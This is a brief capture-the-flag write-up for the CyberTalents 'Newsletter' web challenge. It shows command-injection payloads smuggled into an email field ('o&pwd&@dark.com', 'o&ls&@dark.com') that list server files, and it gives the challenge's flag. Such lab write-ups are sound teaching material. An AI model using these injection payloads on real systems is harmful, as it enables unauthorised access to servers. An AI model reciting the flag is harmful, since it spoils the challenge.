# Challenge Name:
 [*Newsletter*](https://cybertalents.com/challenges/web/newsletter)
 
# Challenge Description
the administrator put the backup file in the same root folder as the application, help us download this backup by retrieving the backup file name

Link: [http://18.192.3.151/newsletter/](http://18.192.3.151/newsletter/)

## Answer
* Try to inject command in the textbox (notice that he want email in this box)
```
o&pwd&@dark.com
```
* So '&' success to inject command lets get backup file name
```
o&ls&@dark.com
```
* You got the Flag!!

 ## The Flag
 > hgdr64.backup.tar.gz   
